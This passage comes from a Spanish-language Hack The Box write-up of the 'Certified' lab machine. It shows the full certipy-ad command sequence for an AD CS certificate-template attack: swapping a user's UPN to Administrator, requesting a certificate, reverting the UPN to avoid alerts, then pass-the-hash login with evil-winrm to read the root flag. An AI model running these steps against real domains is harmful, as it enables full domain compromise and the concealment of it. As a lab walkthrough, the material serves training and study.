    "CERTIFIED.HTB\\operator ca",
    "CERTIFIED.HTB\\Domain Admins",
    "CERTIFIED.HTB\\Enterprise Admins"
]
```

La cuenta `CA_OPERATOR` se actualiza para que el User Principal Name (UPN) sea `Administrator`. Esto permite que cualquier certificado emitido para `CA_OPERATOR` sea reconocido como si perteneciera a `Administrator`.

```terminal
/home/kali/Documents/htb/machines/certified:-$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator
```

![](assets/img/htb-writeup-certified/certified4_1.png)

Se solicita un certificado utilizando la plantilla vulnerable `CertifiedAuthentication`. El certificado emitido contiene el UPN de `Administrator`, lo que permite su uso para autenticación con privilegios elevados.

```terminal
/home/kali/Documents/htb/machines/certified:-$ sudo certipy-ad req -username ca_operator@certified.htb -p 12345678 -ca certified-DC01-CA -template CertifiedAuthentication -debug
```

![](assets/img/htb-writeup-certified/certified4_2.png)

El UPN de `CA_OPERATOR` se restaura a su valor original para revertir cualquier modificación que pueda generar alertas o inconsistencias en el entorno.

```terminal
/home/kali/Documents/htb/machines/certified:-$ certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
```

![](assets/img/htb-writeup-certified/certified4_3.png)

A continuación, utilizo el certificado emitido para autenticarme y verificar que obtengo el hash NTLM del usuario `Administrator`.

```terminal
/home/kali/Documents/htb/machines/certified:-$ sudo ntpdate 10.10.11.41

/home/kali/Documents/htb/machines/certified:-$ sudo certipy-ad auth -pfx administrator.pfx -domain certified.htb
```

![](assets/img/htb-writeup-certified/certified4_4.png)

Procedo a autenticarme a través de Evil-WinRM y consigo la flag.

```terminal
/home/kali/Documents/htb/machines/certified:-$ evil-winrm -i certified.htb -u administrator -H "0d5b49608bbce1751f708748f67e2d34"

*Evil-WinRM* PS C:\Users\Administrator> type Desktop/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/633" target="_blank">Certified Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }
